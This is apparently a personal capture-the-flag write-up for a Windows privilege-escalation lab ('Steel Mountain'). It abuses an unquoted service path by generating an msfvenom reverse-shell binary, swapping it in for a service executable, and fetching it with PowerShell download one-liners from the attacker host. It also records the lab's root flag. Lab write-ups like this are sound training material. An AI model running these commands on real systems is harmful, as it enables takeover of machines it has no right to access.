## metasploit

using the powershell script

https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

upload and execute

![[Pasted image 20210527131114.png]]

and run `Invoke-AllChesks`

![[Pasted image 20210527132801.png]]

#### unquoted service path vulnerability
![[Pasted image 20210527133239.png]]

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.4.208 LPORT=9001 -f exe -o exploit.exe`

![[Pasted image 20210527133515.png]]

Upload the explolit and replace the original service

```
sc stop AdvancedSystemCareService9
upload /home/sp00f/THM/steelmountain/www/exploit.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"

sc start AdvancedSystemCareService9
```

![[Pasted image 20210527134000.png]]

and we got shell as root
![[Pasted image 20210527134157.png]]

![[Pasted image 20210527134207.png]]

root flag == 9af5f314f57607c00fd09803a587db80
![[Pasted image 20210527134312.png]]

## without metasploit
transfer the winpeas binary and run
```powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.17.4.208/winPEASx64.exe','C:\Users\bill\Desktop\winPEASx64.exe')"
```

![[Pasted image 20210527140613.png]]

![[Pasted image 20210527143409.png]]

or 
`powershell -c Get-Service`

![[Pasted image 20210527143618.png]]


```powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.17.4.208/exploit.exe','C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe')"
```

start the service and we got root

![[Pasted image 20210527143903.png]]